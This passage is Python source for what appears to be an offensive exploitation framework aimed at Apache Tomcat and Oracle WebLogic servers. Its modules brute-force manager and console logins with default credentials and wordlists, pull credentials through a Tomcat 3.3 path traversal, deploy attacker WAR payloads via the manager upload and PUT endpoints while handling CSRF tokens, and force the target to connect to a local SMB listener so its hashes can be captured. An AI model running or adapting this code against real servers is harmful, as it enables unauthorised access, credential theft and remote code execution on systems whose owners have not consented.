                    stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"
                                    % (utility.timestamp(), state.bf_user, idx+1, len(wordlist)))

                    cook = _auth(state.bf_user, word, url)
                    if cook:
                        print ''

                        # lets insert these credentials to the default list so we
                        # don't need to bruteforce it each time
                        if not (state.bf_user, word) in default_credentials:
                            default_credentials.insert(0, (state.bf_user, word))

                        utility.Msg("Successful login %s:%s" % (state.bf_user, word),
                                                                LOG.SUCCESS)
                        return cook

                print ''

            except KeyboardInterrupt:
                pass

########NEW FILE########
__FILENAME__ = fetch_creds
from auxiliary import Auxiliary
from re import findall
from log import LOG
import utility

class Auxiliary:
    """ Tomcat 3.x allows traversing the local path, so we can use that to
    fetch credentials
    """

    def __init__(self):
        self.name = 'Fetch credentials'
        self.versions = ['3.3']
        self.show = False
        self.flag = 'tc-ofetch' # someday there might be a real fetch...

    def check(self, fingerprint):
        if fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Simple fetch
        """

        utility.Msg("Fetching credentials...")
        base = 'http://{0}:{1}'.format(fingerengine.options.ip,
                                       fingerprint.port)
        uri = '/conf/users/admin-users.xml'

        response = utility.requests_get(base + uri)
        if response.status_code is 200:

           un = findall("name=\"(.*?)\"", response.content)
           pw = findall("password=\"(.*?)\"", response.content)
           if len(pw) > 0 and len(un) > 0:
               utility.Msg("Found credentials:")
               for (u, p) in zip(un, pw):
                   utility.Msg("\t%s:%s" % (u, p), LOG.SUCCESS)

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from auxiliary import Auxiliary
from log import LOG
import utility


class Auxiliary:
    """ The Manager application for Tomcat has a nifty fingerprinting
        app that allows us to retrieve host OS, versioning, arch, etc.
        which may aid in targeting payloads.
    """

    def __init__(self):
        self.name = 'Gather Tomcat info'
        self.versions = ['Any']
        self.show = True
        self.flag = 'tc-info'

    def check(self, fingerprint):
        """
        """

        if fingerprint.title == TINTERFACES.MAN:
            return True

        return False

    def run(self, fingerengine, fingerprint):

        utility.Msg("Attempting to retrieve Tomcat info...")
        base = "http://{0}:{1}".format(fingerengine.options.ip,
                                       fingerprint.port)
        relative = '/manager/serverinfo'

        if fingerprint.version in ["7.0", "8.0"]:
            relative = '/manager/text/serverinfo'

        url = base + relative

        response = utility.requests_get(url)
        if response.status_code == 401:
            utility.Msg("Host %s:%s requires auth, checking..." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(url, cookies=cookies[0],
                                            auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code == 200:

            info = response.content.split('\n')[1:-1]
            for entry in info:
                utility.Msg(entry)

########NEW FILE########
__FILENAME__ = list_wars
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from auxiliary import Auxiliary
from log import LOG
import utility


class Auxiliary:
    """ Obtain a list of deployed WARs
    """

    def __init__(self):
        self.name = 'List deployed WARs'
        self.versions = ['Any']
        self.show = True
        self.flag = 'tc-list'

    def check(self, fingerprint):
        """
        """
        
        if fingerprint.title == TINTERFACES.MAN:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Obtain a list of deployed WARs on a remote Tomcat instance
        """

        utility.Msg("Obtaining deployed applications...")
        base = "http://{0}:{1}".format(fingerengine.options.ip,
                                           fingerprint.port)
        relative = '/manager/list'
            
        if fingerprint.version in ["7.0", "8.0"]:
            relative = '/manager/text/list'

        url = base + relative

        response = utility.requests_get(url)
        if response.status_code == 401:
            utility.Msg('Host %s:%s requires auth, checking...' %
                               (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(url, cookies=cookies[0], 
                                                    auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return
            
        if response.status_code == 200:

            apps = response.content.split('\n')[1:-1]
            for app in apps:
                utility.Msg("App found: %s" % app.split(':', 1)[0])

        else:
            utility.Msg("Unable to retrieve %s (HTTP %d)" % (url, 
                                    response.status_code), LOG.DEBUG)

########NEW FILE########
__FILENAME__ = smb_hashes
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from src.lib.cifstrap import Handler
from requests.utils import dict_from_cookiejar
from auxiliary import Auxiliary
from threading import Thread
from re import findall
from collections import OrderedDict
from time import sleep
import socket
import utility
import state


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ['5.0', '5.5', '6.0', '7.0', '8.0']
        self.show = True
        self.flag = 'tc-smb'
        self._Listen = False
    
    def check(self, fingerprint):
        if fingerprint.title in [TINTERFACES.MAN]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Same concept as the JBoss module, except we actually invoke the
        deploy function.
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener...")

        self._Listen = True
        thread = Thread(target=self.smb_listener)
        thread.start()
        
        utility.Msg("Invoking UNC deployer...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)

        if fingerprint.version in ["5.5"]:
            uri = '/manager/html/deploy?deployPath=/asdf&deployConfig=&'\
                  'deployWar=file://{0}/asdf.war'.format(utility.local_address())
        elif fingerprint.version in ["6.0", "7.0", "8.0"]:
            return self.runLatter(fingerengine, fingerprint, thread)
        else:
            utility.Msg("Unsupported Tomcat (v%s)" % fingerprint.version, LOG.ERROR)
            return

        url = base + uri

        response = utility.requests_get(url)
        if response.status_code == 401:

            utility.Msg("Host %s:%s requires auth, checking..." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)
        
            if cookies:
                response = utility.requests_get(url, cookies=cookies[0], 
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return
        
        while thread.is_alive(): 
            # spin...
            sleep(1)

        if response.status_code != 200:

            utility.Msg("Unexpected response: HTTP %d" % response.status_code)
    
        self._Listen = False

    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(state.timeout)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                try:
                    (con, addr) = sock.accept()
                except:
                    # timeout
                    return

                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    sleep(1)

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()

    def runLatter(self, fingerengine, fingerprint, smb_thread):
        """
        """

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/manager/html/deploy"
        data = OrderedDict([
                    ("deployPath", "/asdf"),
                    ("deployConfig", ""),
                    ("deployWar", "file://{0}/asdf.war".format(utility.local_address())),
                   ])

        cookies = None
        nonce = None

        # probe for auth
        response = utility.requests_get(base + '/manager/html')
        if response.status_code == 401:
            
            utility.Msg("Host %s:%s requires auth, checking.." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(base + '/manager/html', 
                                                cookies=cookies[0],
                                                auth=cookies[1])

                # get nonce
                nonce = findall("CSRF_NONCE=(.*?)\"", response.content)
                if len(nonce) > 0:
                    nonce = nonce[0]
               
                # set new jsessionid
                cookies = (dict_from_cookiejar(response.cookies), cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                                (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
                return

        if response.status_code == 200:

            try:
                # all setup, now invoke
                response = utility.requests_post(base + uri + \
                                        '?org.apache.catalina.filters.CSRF_NONCE=%s' % nonce,
                                        data = data, cookies=cookies[0],
                                        auth=cookies[1])
            except:
                # timeout
                pass

            while smb_thread.is_alive():
                # spin...
                sleep(1) 

########NEW FILE########
__FILENAME__ = manage_deploy
from src.platform.tomcat.interfaces import TINTERFACES
from src.platform.tomcat.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from requests import exceptions
from log import LOG
import utility

versions = ["4.0", "4.1", "5.0", "5.5", "6.0", "7.0", "8.0"]
title = TINTERFACES.MAN
def deploy(fingerengine, fingerprint):
    """ Through Tomcat versions, remotely deploying hasnt changed much.
    Newer versions have a new URL and some quarks, but it's otherwise very
    stable and quite simple.  Tomcat cannot be asked to pull a file, and thus
    we just execute a PUT with the payload.  Simple and elegant.
    """

    war_file = fingerengine.options.deploy
    war_path = parse_war_path(war_file)
    version_path = "manager/deploy"

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    if fingerprint.version in ["7.0", "8.0"]:
        # starting with version 7.0, the remote deployment URL has changed
        version_path = "manager/text/deploy"

    url = "http://{0}:{1}/{2}?path=/{3}".format(fingerengine.options.ip,
                                                fingerprint.port,
                                                version_path,
                                                war_path)

    try:
        files = open(war_file, 'rb')
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
        return

    response = utility.requests_put(url, data=files)
    if response.status_code == 401 or \
            (response.status_code == 405 and fingerprint.version == "8.0"):
            # Tomcat 8.0 405's if you PUT without auth
        utility.Msg("Host %s:%s requires auth, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            try:
                response = utility.requests_put(url,
                                            data=files,
                                            cookies=cookies[0],
                                            auth=cookies[1])
            except exceptions.Timeout:
                response.status_code = 200

        else:
            utility.Msg("Could not get auth for %s:%s" %
                           (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if response.status_code == 200 and 'Deployed application at' in response.content:
        utility.Msg("Deployed {0} to /{1}".format(war_file, war_path), LOG.SUCCESS)
    elif 'Application already exists' in response.content:
        utility.Msg("Application {0} is already deployed.".format(war_file), LOG.ERROR)
    elif response.status_code == 403:
        utility.Msg("This account does not have permissions to remotely deploy.", LOG.ERROR)
    else:
        utility.Msg("Failed to deploy (HTTP %s)" % response.status_code, LOG.ERROR)

########NEW FILE########
__FILENAME__ = webmanage_deploy
from src.platform.tomcat.interfaces import TINTERFACES
from src.platform.tomcat.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from requests.utils import dict_from_cookiejar
from requests import exceptions
from re import findall
from log import LOG
import utility

versions = ['4.0', '4.1', '5.0', '5.5', '6.0', '7.0', '8.0']
title = TINTERFACES.MAN
def deploy(fingerengine, fingerprint):
    """ This deployer is slightly different than manager_deploy in
    that it only requires the manager-gui role.  This requires us
    to deploy like one would via the web interface. 
    """

    base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
    uri = '/manager/html/upload'
    war_file = fingerengine.options.deploy
    war_path = parse_war_path(war_file)
    cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                        fingerprint.title, fingerprint.version)
    if not cookies:
        utility.Msg("Could not get auth for %s:%s" %
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    if fingerprint.version in ['6.0', '7.0', '8.0']:
        # deploying via the gui requires a CSRF token
        (csrf, c) = fetchCSRF(base, cookies)
        if not csrf:
            return
        else:
            # set CSRF and refresh session id
            uri += '?org.apache.catalina.filters.CSRF_NONCE={0}'
            uri = uri.format(csrf)
            cookies = (c, cookies[1])

    # read in payload
    try:
        tag = 'deployWar'
        if fingerprint.version in ['4.0', '4.1']:
            tag = 'installWar'
        files = {tag : (war_path + '.war', open(war_file, 'rb'))}
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
        return

    # deploy
    response = utility.requests_post(base + uri, files=files, cookies=cookies[0],
                                                              auth=cookies[1])

    if response.status_code is 200 and "OK" in response.content:
        utility.Msg("Deployed {0} to /{1}".format(war_file, war_path), LOG.SUCCESS)
    elif 'Application already exists' in response.content:
        utility.Msg("Application {0} is already deployed".format(war_file), LOG.ERROR)
    elif response.status_code is 403:
        utility.Msg("This account does not have permissions to remotely deploy.  Try"\
                    " using manager_deploy", LOG.ERROR)
    else:
        utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)


def fetchCSRF(url, cookies):
    """ Fetch and return a tuple of the CSRF token and the
    refreshed session ID
    """

    response = None
    try:
        csrf = None
        uri = '/manager/html'
        response = utility.requests_get(url + uri, cookies=cookies[0],
                                                   auth=cookies[1])

        if response.status_code is 200:

            data = findall('CSRF_NONCE=(.*?)\"', response.content)
            if len(data) > 0:
                csrf = data[0]

    except Exception, e:
        utility.Msg("Failed to fetch CSRF token (HTTP %d)" % response.status_code,
                                                             LOG.ERROR)
        csrf = None

    return (csrf, dict_from_cookiejar(response.cookies))

########NEW FILE########
__FILENAME__ = Tomcat33
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.3"
        self.uri = "/doc/readme"

########NEW FILE########
__FILENAME__ = Tomcat33Admin
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from requests import exceptions
from cprint import FingerPrint
from re import findall
from log import LOG
import utility

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "tomcat"
        self.version = "3.3"
        self.title = TINTERFACES.ADM
        self.uri = "/admin/index.html"
        self.port = 8080
        self.hash = None

    def check(self, ip, port=None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            found = findall("Tomcat Administration Tools", response.content)

            if len(found) > 0: 
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                            ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                            ip, rport),
                                                        LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = Tomcat4
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from requests import exceptions
from cprint import FingerPrint
from re import findall
from log import LOG
import utility

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "tomcat"
        self.version = "4.0"
        self.title = TINTERFACES.APP
        self.uri = "/index.jsp"
        self.port = 8080
        self.hash = None

    def check(self, ip, port=None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            found = findall("Apache Tomcat/(.*?)\n", response.content)
            if len(found) > 0 and self.version in found[0]: 
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                            ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                            ip, rport),
                                                        LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = Tomcat41
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from requests import exceptions
from cprint import FingerPrint
from re import findall
from log import LOG
import utility

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "tomcat"
        self.version = "4.1"
        self.title = TINTERFACES.APP
        self.uri = "/index.jsp"
        self.port = 8080
        self.hash = None

    def check(self, ip, port=None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            found = findall("Apache Tomcat/(.*?)\n", response.content)
            if len(found) > 0 and self.version in found[0]: 
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                            ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                            ip, rport), 
                                                        LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = Tomcat41M
from src.platform.tomcat.interfaces import ManagerInterface

class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.1"

########NEW FILE########
__FILENAME__ = Tomcat4M
from src.platform.tomcat.interfaces import ManagerInterface


class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = Tomcat5
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.0"

########NEW FILE########
__FILENAME__ = Tomcat55
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.5"

########NEW FILE########
__FILENAME__ = Tomcat55M
from src.platform.tomcat.interfaces import ManagerInterface

class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.5"

########NEW FILE########
__FILENAME__ = Tomcat5M
from src.platform.tomcat.interfaces import ManagerInterface

class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "5.0"

########NEW FILE########
__FILENAME__ = Tomcat6
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "6.0"

########NEW FILE########
__FILENAME__ = Tomcat6M
from src.platform.tomcat.interfaces import ManagerInterface


class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "6.0"

########NEW FILE########
__FILENAME__ = Tomcat7
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "7.0"

########NEW FILE########
__FILENAME__ = Tomcat7M
from src.platform.tomcat.interfaces import ManagerInterface


class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "7.0"

########NEW FILE########
__FILENAME__ = Tomcat8
from src.platform.tomcat.interfaces import AppInterface


class FPrint(AppInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "8.0"

########NEW FILE########
__FILENAME__ = Tomcat8M
from src.platform.tomcat.interfaces import ManagerInterface


class FPrint(ManagerInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "8.0"

########NEW FILE########
__FILENAME__ = interfaces
from requests import exceptions
from cprint import FingerPrint
from re import findall
from log import LOG
import authenticate
import random
import string
import utility


class TINTERFACES:
    APP = "Tomcat"
    MAN = "Tomcat Manager"
    ADM = "Tomcat Admin"

class ManagerInterface(FingerPrint):
    """ This class defines the default management fingerprint for Tomcat.
    The version number is stripped out of the index page.
    """

    def __init__(self):
        self.platform = "tomcat"
        self.version = None
        self.title = TINTERFACES.MAN
        self.uri = "/manager/html"
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code == 401:
                utility.Msg("Host %s:%s requires auth for manager, checking.."
                                % (ip, rport), LOG.DEBUG)

                cookies = authenticate.checkAuth(ip, rport, self.title, self.version)
                if cookies:
                    response = utility.requests_get(url, cookies=cookies[0],
                                                    auth=cookies[1])
                else:
                    utility.Msg("Could not get auth for %s:%s" % (ip, rport),
                                                                LOG.ERROR)

            if response.status_code == 200:
                found = findall("Apache Tomcat/(.*)<", response.content)
                if len(found) > 0 and self.version in found[0]:
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                        ip, rport), LOG.DEBUG)

        return False

class AppInterface(FingerPrint):
    """ AppInterface defines the default app fingerprint for Tomcat.  This
    pulls the version number from the release notes.
    """

    def __init__(self):
        self.platform = "tomcat"
        self.version = None
        self.title = TINTERFACES.APP
        self.uri = "/RELEASE-NOTES.txt"
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            found = findall("Apache Tomcat Version (.*?)\n", response.content)

            if len(found) > 0 and self.version in found[0]:
                return True
            else:
                return self.check_error(ip, rport)

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)

        return False
        
    def check_error(self, ip, port):
        """
        """

        try:
            fpath = ''.join(random.choice(string.ascii_lowercase) for x in range(4))
            url = "http://{0}:{1}/{2}".format(ip, port, fpath)

            response = utility.requests_get(url)
            if response.status_code == 404:

                data = findall("<h3>(.*?)</h3>", response.content)
                if len(data) > 0 and self.version in data[0]:
                    return True

            else:
                utility.Msg("/%s returned unexpected HTTP code (%d)" %\
                                (fpath, response.status_code), LOG.DEBUG)

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, port), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                        ip, port), LOG.DEBUG)

        return False


########NEW FILE########
__FILENAME__ = undeployer
from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from src.module.deploy_utils import parse_war_path
from requests.utils import dict_from_cookiejar
from re import findall
from log import LOG
import utility

titles = [TINTERFACES.MAN]
def undeploy(fingerengine, fingerprint):
    """ This module is used to undeploy a context from a remote Tomcat server.
    In general, it is as simple as fetching /manager/html/undeploy?path=CONTEXT
    with an authenticated GET request to perform this action.

    However, Tomcat 6.x proves to not be as nice.  The undeployer in 6.x requires
    a refreshed session ID and a CSRF token.  This requires one more request on
    our part.

    Tomcat 7.x and 8.x expose /manager/text/undeploy which can bypass
    the need for a CSRF token.
    """

    context = parse_war_path(fingerengine.options.undeploy)
    base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)

    cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                        fingerprint.title, fingerprint.version)
    if not cookies:
        utility.Msg("Could not get auth for %s:%s" % 
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
        return


    if fingerprint.version in ["7.0", "8.0"]:
        uri = "/manager/text/undeploy?path=/{0}".format(context)
    elif fingerprint.version in ['4.0', '4.1']:
        uri = '/manager/html/remove?path=/{0}'.format(context)
    else:
        uri = "/manager/html/undeploy?path=/{0}".format(context)

        if fingerprint.version in ['6.0']:
            (csrf, c) = fetchCSRF(base, cookies)
            uri += '&org.apache.catalina.filters.CSRF_NONCE=%s' % csrf 
            # rebuild our auth tuple
            cookies = (c, cookies[1])

    url = base + uri
    utility.Msg("Preparing to undeploy {0}...".format(context))

    response = utility.requests_get(url, cookies=cookies[0],
                                         auth=cookies[1])
    
    if response.status_code == 200 and \
                ('Undeployed application at context' in response.content or\
                 'OK' in response.content):
        utility.Msg("Successfully undeployed %s" % context, LOG.SUCCESS)
    elif 'No context exists for path' in response.content:
        utility.Msg("Could not find a context for %s" % context, LOG.ERROR)
    else:
        utility.Msg("Failed to undeploy (HTTP %s)" % response.status_code, LOG.ERROR)


def fetchCSRF(url, cookies):
    """ Tomcat 6.x is a huge pain; we need the refreshed cookie and CSRF token
    to correctly undeploy

    This will return the CSRF token and new session id
    """

    response = None
    try:
        csrf = None
        uri = '/manager/html'
        response = utility.requests_get(url + uri, cookies=cookies[0],
                                                   auth=cookies[1])

        if response.status_code is 200:
            
            data = findall("CSRF_NONCE=(.*?)\"", response.content)
            if len(data) > 0:
                csrf = data[0]

    except Exception, e:
        utility.Msg("Failed to fetch CSRF token (HTTP %d)" % response.status_code,
                                                             LOG.ERROR)
        csrf = None

    return (csrf, dict_from_cookiejar(response.cookies))

########NEW FILE########
__FILENAME__ = authenticate
from src.platform.weblogic.interfaces import WINTERFACES
from requests.utils import dict_from_cookiejar
from sys import stdout
from log import LOG
import utility
import state


default_credentials = [('weblogic', 'weblogic'),
                       ('weblogic', 'weblogic1')
                      ]

def _auth(usr, pswd, ip, fingerprint):
    """ Authenticate to j_security_check and return the cookie
    """

    try:
        base = "http://{0}:{1}".format(ip, fingerprint.port)
        uri = "/console/j_security_check"

        data = { "j_username" : usr,
                 "j_password" : pswd,
                 "j_character_encoding" : "UTF-8"
               }

        if fingerprint.title is WINTERFACES.WLS:
            base = base.replace("http", "https")

        response = utility.requests_post(base + uri, data=data)
        if len(response.history) > 1:

                cookies = dict_from_cookiejar(response.history[0].cookies)
                if not cookies:
                    return False
                else:
                    utility.Msg("Successfully authenticated with %s:%s" % 
                                    (usr, pswd), LOG.DEBUG)
                    return (cookies, None)

    except Exception, e: 
        utility.Msg("Failed to authenticate: %s" % e)
     
    return False 


def checkAuth(ip, fingerprint, returnCookie = False):
    """ Default behavior is to simply return True/False based on
    whether or not authentication with the credentials was successful.
    If returnCookie is set to true, we return the required auth cookie.

    Returns a tuple of (usr, pswd) in the event of a success, otherwise
    (None, None) is returned.
    """

    # check with given auth
    if state.usr_auth:
        (usr, pswd) = state.usr_auth.split(':')
        auth = _auth(usr, pswd, ip, fingerprint)
        if auth:
            return auth

    # else try default credentials
    for (usr, pswd) in default_credentials:

        auth = _auth(usr, pswd, ip, fingerprint)
        if auth:
            return auth

    # if we're still here, lets check for a wordlist
    if state.bf_wordlist and not state.hasbf:
    
        #
        # by default, certain WebLogic servers have a lockout of 5 attempts 
        # before a 30 minute lock.  Lets confirm the user knows this.
        #
        tmp = utility.capture_input("WebLogic has a lockout after 5 attempts.  Continue? [Y/n]")
        if 'n' in tmp: return (None, None)

        state.hasbf = True
        wordlist = []

        try:
            with open(state.bf_wordlist, 'r') as f:
                wordlist = [x.decode('ascii', "ignore").rstrip() for x in f.readlines()]
        except Exception, e:
            utility.Msg(e, LOG.DEBUG)
            return (None, None)

        utility.Msg('Brute forcing %s account with %d passwords...' % 
                                    (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:
            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m" \
                                % (utility.timestamp(), state.bf_user,
                                   idx+1, len(wordlist)))

                auth = _auth(state.bf_user, word, ip, fingerprint)
                if auth:
                    print ''

                    # insert creds into default cred list
                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))

                    utility.Msg("Successful login %s:%s" % 
                                    (state.bf_user, word), LOG.SUCCESS)
                    return auth

            print ''

        except KeyboardInterrupt:
            pass

    return (None, None)

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'Gather WebLogic info'
        self.versions = ["10", "12"]
        self.show = True
        self.flag = 'wl-info'

    def check(self, fingerprint):
        return True

    def run(self, fingerengine, fingerprint):

        cookies = checkAuth(fingerengine.options.ip, fingerprint)
        if not cookies[0]:
            utility.Msg("This module requires valid credentials.", LOG.ERROR)
            return

        utility.Msg("Attempting to retrieve WebLogic info...")

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        if fingerprint.title is WINTERFACES.WLS:
           base = base.replace('http', 'https')

        server_name = self.fetchServerName(base, cookies[0])
        uri = "/console/console.portal?_nfpb=true&_pageLabel=ServerMonitoringTabmonitoringTabPage&"\
              "handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3D{0}"\
              "%2CType%3DServer%22%29".format(server_name)

        response = utility.requests_get(base + uri, cookies=cookies[0])
        if response.status_code == 200:

            tags = findall("class=\"likeLabel\">(.*?):</span>", response.content)
            values = findall("class=\"inputFieldRO\"><div>(.*?)</div>", response.content.replace('\r\n', ''))

            if len(tags) > 0:
               for (key, value) in zip(tags, values):
                   utility.Msg("  %s: %s" % (key, value))

        else:
            utility.Msg("Unable to fetch server '%s' information (HTTP %d)" %
                            (server_name, response.status_code), LOG.ERROR)

    def fetchServerName(self, base, cookie):
        """
        """

        uri = "/console/console.portal?_nfpb=true&_pageLabel=CoreServerServerTablePage"

        response = utility.requests_get(base + uri, cookies=cookie)
        if response.status_code is 200:

            servers = findall("\"Select (.*?)&#40", response.content)
            if len(servers) > 0:
                return servers[0]

########NEW FILE########
__FILENAME__ = list_wars
from src.platform.weblogic.authenticate import checkAuth
from src.platform.weblogic.interfaces import WINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'List deployed apps'
        self.versions = ["10", "12"]
        self.show = True
        self.flag = 'wl-list'

    def check(self, fingerprint):
        return True

    def run(self, fingerengine, fingerprint):
        
        cookies = checkAuth(fingerengine.options.ip, fingerprint)
        if not cookies[0]:
            utility.Msg("This module requires valid credentials.", LOG.ERROR)
            return

        utility.Msg("Obtaining deployed applications...")

